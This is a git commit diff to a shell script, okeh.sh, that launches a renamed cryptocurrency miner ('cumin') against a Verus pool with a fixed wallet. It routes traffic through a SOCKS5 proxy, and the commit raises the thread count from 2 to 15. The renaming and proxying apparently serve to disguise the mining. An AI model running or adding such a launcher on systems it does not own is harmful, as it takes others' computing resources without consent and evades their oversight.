18f7b7e09086052fa3e25e5fa0e42cdc2c688a4c
githaeka <92292441+githaeka@users.noreply.github.com>
2021-10-11 14:33:20 +0000

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -7,4 +7,4 @@ POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
 WORKER=$(echo $(shuf -i 1-1 -n 1)-X)
 PROXY=socks5://192.111.135.21:4145
-./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 15 -x $PROXY
